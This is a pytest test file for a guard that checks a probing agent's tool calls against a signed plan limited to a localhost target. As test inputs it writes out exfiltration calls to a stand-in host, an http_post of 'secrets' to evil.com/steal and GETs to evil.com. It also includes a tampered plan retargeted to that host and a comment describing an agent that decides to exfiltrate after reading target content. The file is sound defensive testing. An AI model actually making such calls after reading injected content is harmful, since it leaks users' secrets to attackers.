"""Plan-commitment self-defense on the prove tool."""

from __future__ import annotations

import pytest

from tainted.selfdefense import AllowedCall, PlanGuard, PlanViolation, ProbePlan, commit

SECRET = b"session-secret"


def _plan() -> ProbePlan:
    return ProbePlan(
        target_url="http://localhost:54321",
        allowed=[
            AllowedCall(
                tool="http_get",
                arg_constraints={
                    "url": "re:http://localhost:54321/rest/v1/.*",
                    "method": ["GET"],
                },
            ),
            AllowedCall(tool="authenticate", arg_constraints={"account": ["A", "B"]}),
        ],
    )


def test_permitted_calls_pass():
    plan = _plan()
    guard = PlanGuard(plan, commit(plan, SECRET), SECRET)
    guard.check("http_get", {"url": "http://localhost:54321/rest/v1/invoices", "method": "GET"})
    guard.check("authenticate", {"account": "B"})
    assert guard.blocked_calls == []


def test_call_outside_plan_is_refused():
    plan = _plan()
    guard = PlanGuard(plan, commit(plan, SECRET), SECRET)
    # An exfiltration the tool "decided" to do after reading target content.
    with pytest.raises(PlanViolation):
        guard.check("http_post", {"url": "http://evil.com/steal", "body": "secrets"})
    # A permitted tool but a disallowed argument (different host).
    with pytest.raises(PlanViolation):
        guard.check("http_get", {"url": "http://evil.com/x", "method": "GET"})
    assert len(guard.blocked_calls) == 2


def test_tampered_plan_fails_signature():
    plan = _plan()
    sig = commit(plan, SECRET)
    tampered = ProbePlan(
        target_url="http://evil.com",  # attacker retargets the plan
        allowed=plan.allowed,
    )
    with pytest.raises(PlanViolation):
        PlanGuard(tampered, sig, SECRET)


def test_guarded_wrapper_blocks_before_calling():
    plan = _plan()
    guard = PlanGuard(plan, commit(plan, SECRET), SECRET)
    calls = []

    @guard.guarded("http_get")
    def do_get(**kw):
        calls.append(kw)
        return "ok"

    do_get(url="http://localhost:54321/rest/v1/notes", method="GET")
    assert len(calls) == 1
    with pytest.raises(PlanViolation):
        do_get(url="http://evil.com", method="GET")
    assert len(calls) == 1  # the blocked call never reached the function
